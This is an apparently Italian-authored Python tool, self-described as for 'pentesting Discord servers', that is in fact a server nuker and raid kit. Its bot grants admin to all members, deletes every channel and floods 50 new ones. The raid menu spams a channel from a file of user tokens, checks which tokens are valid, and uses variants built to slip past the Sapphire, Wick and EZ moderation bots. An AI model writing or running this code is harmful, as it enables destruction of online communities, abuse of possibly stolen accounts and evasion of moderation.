import os
import discord
from discord.ext import commands
import asyncio
from asyncio import *
import random
import colorama
import requests
import threading
from pystyle import *
from colorama import Fore
import string
from config import *
import datetime
import time
import string

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
light_green = Fore.LIGHTGREEN_EX
blue = Fore.YELLOW
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
white = Fore.WHITE
light_magenta = Fore.LIGHTMAGENTA_EX
light_cyan = Fore.LIGHTCYAN_EX
pinketta = Fore.MAGENTA + Fore.GREEN

colorama.init()

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

os.system("title #ChoseNukPack TheEnd")
os.system("cls")

ascii_art = f'''


                                ████████╗██╗  ██╗███████╗    ███████╗███╗   ██╗██████╗ 
                                ╚══██╔══╝██║  ██║██╔════╝    ██╔════╝████╗  ██║██╔══██╗
                                   ██║   ███████║█████╗      █████╗  ██╔██╗ ██║██║  ██║
                                   ██║   ██╔══██║██╔══╝      ██╔══╝  ██║╚██╗██║██║  ██║
                                   ██║   ██║  ██║███████╗    ███████╗██║ ╚████║██████╔╝
                                   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═══╝╚═════╝ 
                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
                                    [1] Nuker                           [2] Raid                         
                                                        [x] Info

                                    Advanced tool for pentesting Discord servers (6.0.5)
                                 
'''

def main_screen():
    while True: 
        Write.Print(ascii_art, Colors.white_to_red, interval=0.000)


        choice = input(f"""{red}                              #ChoseNukPack@TheEnd ~
                                ↪ """)

        if choice == 'info':
           ToolInfo()
        elif choice == 'nuker':
            nuke_option()
        elif choice == 'raid':
            raid_option()
        elif choice == 'exit':
            exit(code=104)
        else:
            os.system("cls")


def ToolInfo():
    print("""
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Metti La tag #CHOSENUKPACK nel tuo server per rimanere aggiornato sulle novità e ricevere supporto.

    """)
    print("press enter to continue...")    
    input()

def nuke_option():

    bot = commands.Bot(command_prefix=".", intents=discord.Intents().all())
    bot.remove_command('help')

    @bot.event
    async def on_ready():
        os.system("title Nuker")
        os.system("cls")
        Write.Print(f'''


                                ████████╗██╗  ██╗███████╗    ███████╗███╗   ██╗██████╗ 
                                ╚══██╔══╝██║  ██║██╔════╝    ██╔════╝████╗  ██║██╔══██╗
                                   ██║   ███████║█████╗      █████╗  ██╔██╗ ██║██║  ██║
                                   ██║   ██╔══██║██╔══╝      ██╔══╝  ██║╚██╗██║██║  ██║
                                   ██║   ██║  ██║███████╗    ███████╗██║ ╚████║██████╔╝
                                   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═══╝╚═════╝ 
                                                       

                                    .admin ─> admin role                  
                                                                  
                                    .kill  ─> nuke                        
                                                                  
                           

         ''', Colors.white_to_red, interval=0.001)

    @bot.event
    async def on_guild_channel_create(channel):
        while True:
            await channel.send(message)
            time_rn = get_time_rn()
            print(f"{yellow}{message}")
            asyncio.sleep(1)
            

    async def create_admin_role(guild):

        admin_role = discord.utils.get(guild.roles, name='Admin')
        if admin_role is None:
            admin_role = await guild.create_role(name='Admin', permissions=discord.Permissions(administrator=True))
        for member in guild.members:
            await member.add_roles(admin_role)
        return admin_role

    @bot.command(name='admin')
    async def give_admin(ctx):
        admin_role = await create_admin_role(ctx.guild)
        await ctx.send('Admin for everyon')

    @bot.command(name="kill")
    async def die(ctx):
        await create_task(deletechannel(ctx.guild))
        await create_task(channelcreate(ctx.guild))

    async def deletechannel(guild):
        tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*tasks)
        print(f"{red}[ᴅᴇʟᴇᴛᴇ] {gray}──{white}> {yellow}ALL CHANNEL")
        asyncio.sleep(1)

    async def channelcreate(guild):
        tasks = [guild.create_text_channel(random.choice(names)) for _ in range(50)]
        await asyncio.gather(*tasks)
        print(f"{light_green}[ᴄʀᴇᴀᴛᴇ] {gray}──{white}> {yellow}{names}")

    bot.run(token)


def raid_option():
    os.system("cls")
    user_input = ""
    while True: 
        Write.Print("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                                                ⠀⠀⠀⠀⠀⠀⣰⣾⠁⠀⢦⣾⣤⠆⠀⠻⣧⠀⠀⠀⠀⠀⠀
                                                                                ⠀⠀⠀⠀⢠⣼⠏⠀⠀⠀⠀⣿⡇⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀
    • Commands:                                                                 ⠀⠀⢀⣸⣿⠃⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢿⣧⡀⠀⠀
      ► [1] Token Spammer                                                       ⠀⢰⣾⣿⡁⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢀⣿⣿⠖⠀
      ► [2] Token Checker                                                       ⠀⠀⠈⠻⣿⣦⣄⠀⠀⠀⠀⣿⡇⠀⠀⠀⢀⣴⣿⠟⠁⠀⠀
      ► [3] Spammer Bypass Sapphire                                             ⠀⠀⠀⠀⠈⠻⢿⣷⣄⡀⠀⣿⡇⠀⣠⣾⣿⠟⠁⠀⠀⠀⠀
      ► [4] Spammer Bypass Wick                                                 ⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⣿⣧⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀
      ► [5] Spammer Bypass EZ                                                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
      ► [x] Exit                                                                ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
                                                                                ⠀⠀⠀⠀⠀⢀⣴⣿⣿⠟⠁⣻⣿⠈⠙⢿⣿⣦⡀⠀⠀⠀⠀
                                                                                ⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⣽⣿⠀⠀⠀⠙⢿⣿⣦⣄⠀⠀
                                                                                ⠀⣠⣴⣿⡿⠋⠀⠀⠀⠀⠀⢼⣿⠀⠀⠀⠀⠀⠈⢻⣿⣷⣄
                                                                                ⠈⠙⢿⣿⣦⣄⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⣠⣾⣿⠟⠁
                                                                                ⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⢸⣿⠀⠀⠀⣠⣾⣿⠟⠁⠀⠀
      ► #CHOSENUKPACK                                                           ⠀⠀⠀⠀⠀⠙⢻⣿⣷⡄⠀⢸⣿⠀⠀⣼⣿⣿⠃⠀⠀⠀⠀
                                                                                ⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣦⣸⣿⣠⣾⣿⠟⠁⠀⠀⠀⠀⠀
                                                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
                                                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀ 

    #ChoseNukPack@TheEnd ~
     ↪
 """, Colors.white_to_red, interval=0.000)


        Write.Print("                                                    [#] Tool: ", Colors.white_to_red, interval=0.001)
        raid_scelta = input(colorama.Fore.WHITE)

        if raid_scelta == '1':
            option_1()
        elif raid_scelta == '2':
            option_2()
        elif raid_scelta == '3':
            option_3()
        elif raid_scelta == '4':
            option_4()
        elif raid_scelta == '5':
            option_5()
        elif raid_scelta == 'x':
            exit(code=104)
        else:
            os.system("cls")


def option_1():
    global msg_sent, msg_failed, msg_ratelimited

    msg_sent = 0
    msg_failed = 0
    msg_ratelimited = 0

    Write.Print("[#] CHANNEL ID: ", Colors.purple, interval=0.001)
    channel_id = input(colorama.Fore.YELLOW)
    Write.Print("[#] MESSAGE: ", Colors.purple, interval=0.001)
    message_content = input(colorama.Fore.YELLOW)
    Write.Print("[#] HOW MANY TIMES?: ", Colors.purple, interval=0.001)
    repeat_count = int(input(colorama.Fore.YELLOW))

    with open("data/tokens.txt", "r") as file:
        tokens = file.read().splitlines()

    def spammer(token):
        global msg_sent, msg_failed, msg_ratelimited  

        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        headers = {'Authorization': token}
        payload = {'content': f'{message_content}'}
        censored_token = token[:-45] + "*********************************************"
        
        for _ in range(repeat_count):
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                print(f"{light_green}(+) {light_green} {str(message_content)}{yellow}", censored_token)
                msg_sent += 1
            elif response.status_code == 401:
                print(f"{red}(-)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            elif response.status_code == 429:
                print(f"{yellow}(RATELIMIT)  {str(message_content)}{gray}", censored_token)
                msg_ratelimited += 1
            elif response.status_code == 403:
                print(f"{red}(!)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            else:
                print("ERROR", token)

    threads = []
    for token in tokens:
        thread = threading.Thread(target=spammer, args=(token,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"{gray}FINISH")
    print(f"{gray}MESSAGES SENT", msg_sent)
    print(f"{gray}MESSAGES NOT SENT:", msg_failed)
    print(f"{gray}MESSAGES NOT SENT (RATELIMIT):", msg_ratelimited)


def option_2():
    def check_token(token):
        headers = {
            'Authorization': token
        }
        response = requests.get('https://discord.com/api/v9/users/@me/affinities/guilds', headers=headers)

        if response.status_code == 200:
            return f"{Fore.GREEN}[VALID] {gray}{token}"
        elif response.status_code == 401:
            return f"{Fore.RED}[INVALID] {gray}{token}"
        elif response.status_code == 403:
            return f"{Fore.YELLOW}[BLOCKED] {gray}{token}"
        else:
            return f"{Fore.RED}Errore sconosciuto: {gray}{token}"

    tokens_file = os.path.join('data', 'tokens.txt')

    with open(tokens_file, 'r') as file:
        tokens = file.readlines()
        if not tokens:
            print("Il file tokens.txt Ã¨ vuoto.")
        else:
            for token in tokens:
                print(check_token(token.strip()))


def option_3():
    global msg_sent, msg_failed, msg_ratelimited
    

    msg_sent = 0
    msg_failed = 0
    msg_ratelimited = 0


    Write.Print("[#] CHANNEL ID: ", Colors.purple, interval=0.001)
    channel_id = input(colorama.Fore.YELLOW)
    Write.Print("[#] MESSAGE: ", Colors.purple, interval=0.001)
    message_content = input(colorama.Fore.YELLOW)
    Write.Print("[#] HOW MANY TIMES?: ", Colors.purple, interval=0.001)
    repeat_count = int(input(colorama.Fore.YELLOW))

    with open("data/tokens.txt", "r") as file:
        tokens = file.read().splitlines()

    def spammer(token):
        global msg_sent, msg_failed, msg_ratelimited

        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        headers = {'Authorization': token}
        payload = {'content': f'{message_content}'}
        censored_token = token[:-45] + "*********************************************"

        for _ in range(repeat_count):
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                
                print(f"{light_green}(+) {light_green} {str(message_content)}{yellow}", censored_token)
                msg_sent += 1
                time.sleep(2)
            elif response.status_code == 401:
                print(f"{red}(-)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            elif response.status_code == 429:
                print(f"{yellow}(RATELIMIT)  {gray}{str(message_content)}", censored_token)
                msg_ratelimited += 1
            elif response.status_code == 403:
                print(f"{red}(!)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            else:
                print("ERROR", censored_token)
                time.sleep(2)
    threads = []
    for token in tokens:
        thread = threading.Thread(target=spammer, args=(token,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"{gray}FINISH")
    print(f"{gray}MESSAGES SENT", msg_sent)
    print(f"{gray}MESSAGES NOT SENT:", msg_failed)
    print(f"{gray}MESSAGES NOT SENT (RATELIMIT):", msg_ratelimited)

def option_4():
    global msg_sent, msg_failed, msg_ratelimited  # Dichiarazione delle variabili globali

    msg_sent = 0
    msg_failed = 0
    msg_ratelimited = 0

    Write.Print("[#] CHANNEL ID: ", Colors.purple, interval=0.001)
    channel_id = input(colorama.Fore.YELLOW)
    Write.Print("[#] MESSAGE: ", Colors.purple, interval=0.001)
    message_content = input(colorama.Fore.YELLOW)
    Write.Print("[#] HOW MANY TIMES?: ", Colors.purple, interval=0.001)
    repeat_count = int(input(colorama.Fore.YELLOW))

    with open("data/tokens.txt", "r") as file:
        tokens = file.read().splitlines()

    def spammer(token):
        global msg_sent, msg_failed, msg_ratelimited  

        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        headers = {'Authorization': token}
        censored_token = token[:-45] + "*********************************************"

        for _ in range(repeat_count):
            random_letters = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            payload = {'content': f'{message_content} {random_letters}'}

            response = requests.post(url, json=payload, headers=headers)

            if response.status_code == 200:
                print(f"{light_green}(+) {light_green} {str(message_content)}{yellow}", censored_token)
                msg_sent += 1
                time.sleep(9)
            elif response.status_code == 401:
                print(f"{red}(-)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            elif response.status_code == 429:
                print(f"{yellow}(RATELIMIT){gray}  {str(message_content)}{yellow}", censored_token)
                msg_ratelimited += 1
            elif response.status_code == 403:
                print(f"{red}(!)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            else:
                print("ERROR", censored_token)
                time.sleep(11)

    threads = []
    for token in tokens:
        thread = threading.Thread(target=spammer, args=(token,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"{gray}FINISH")
    print(f"{gray}MESSAGES SENT", msg_sent)
    print(f"{gray}MESSAGES NOT SENT:", msg_failed)
    print(f"{gray}MESSAGES NOT SENT (RATELIMIT):", msg_ratelimited)

def option_5():
    global msg_sent, msg_failed, msg_ratelimited  # Dichiarazione delle variabili globali

    msg_sent = 0
    msg_failed = 0
    msg_ratelimited = 0

    Write.Print("[#] CHANNEL ID: ", Colors.purple, interval=0.001)
    channel_id = input(colorama.Fore.YELLOW)
    Write.Print("[#] MESSAGE: ", Colors.purple, interval=0.001)
    message_content = input(colorama.Fore.YELLOW)
    Write.Print("[#] HOW MANY TIMES?: ", Colors.purple, interval=0.001)
    repeat_count = int(input(colorama.Fore.YELLOW))

    with open("data/tokens.txt", "r") as file:
        tokens = file.read().splitlines()

    def spammer(token):
        global msg_sent, msg_failed, msg_ratelimited  

        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        headers = {'Authorization': token}
        censored_token = token[:-45] + "*********************************************"

        for _ in range(repeat_count):
            random_letters = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            payload = {'content': f'{message_content} {random_letters}'}

            response = requests.post(url, json=payload, headers=headers)

            if response.status_code == 200:
                print(f"{light_green}(+) {light_green} {str(message_content)}{yellow}", censored_token)
                msg_sent += 1
                time.sleep(9)
            elif response.status_code == 401:
                print(f"{red}(-)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            elif response.status_code == 429:
                print(f"{yellow}(RATELIMIT)  {gray}{str(message_content)}", censored_token)
                msg_ratelimited += 1
            elif response.status_code == 403:
                print(f"{red}(!)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            else:
                print("ERROR", censored_token)
                time.sleep(11)

    threads = []
    for token in tokens:
        thread = threading.Thread(target=spammer, args=(token,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"{gray}FINISH")
    print(f"{gray}MESSAGES SENT", msg_sent)
    print(f"{gray}MESSAGES NOT SENT:", msg_failed)
    print(f"{gray}MESSAGES NOT SENT (RATELIMIT):", msg_ratelimited)

if __name__ == "__main__":
    main_screen()
    